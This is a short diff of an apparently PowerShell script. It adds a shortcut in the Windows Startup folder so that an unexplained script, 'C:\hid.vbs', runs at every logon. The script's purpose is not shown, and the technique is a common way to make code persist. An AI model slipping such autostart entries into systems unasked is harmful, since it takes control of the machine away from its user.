@@ -4,6 +4,12 @@ $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($destination)
 $shortcut.TargetPath = $source
 $shortcut.Save()
+$source = "C:\hid.vbs"
+$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hid.vbs.lnk"
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($destination)
+$shortcut.TargetPath = $source
+$shortcut.Save()
 $ShortcutPath = "C:\Startup Folder.lnk"
 $TargetPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $WScriptShell = New-Object -ComObject WScript.Shell
